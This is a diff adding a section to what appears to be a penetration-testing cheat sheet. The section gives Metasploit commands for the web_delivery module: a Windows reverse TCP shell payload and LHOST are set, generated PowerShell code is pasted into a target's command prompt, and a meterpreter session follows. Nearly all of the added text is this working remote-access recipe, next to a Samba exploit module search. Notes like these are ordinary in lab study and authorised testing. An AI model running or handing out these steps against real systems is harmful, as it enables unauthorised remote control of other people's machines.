@@ -680,5 +680,23 @@ ________________________________________________________________________________
 Use samba exploit module in meterpreter
 -----------------------------------------
 #search exploit/linux/samba/is_known_pipename
+__________________________________________________________________________________________________________________________________
+Using multi/script/web_delivery meterpreter module to generate PSH code to gain access in Windows
+--------------------------------------------------------------------------------------------------
+
+msf5> search web_delivery
+    > set target PSH\ (Binary)
+    > set payload windows/shell/reverse_tcp 
+    > set PSH-EncodedCommand false 
+    > set LHOST eth1
+    > exploit
+
+It will create PSH code > and paste in into target cmd, after that we get a session in meterpreter
+
+msf5> sessions 1
+
+
+
+
 
 __________________________________________________________________________________________________________________________________
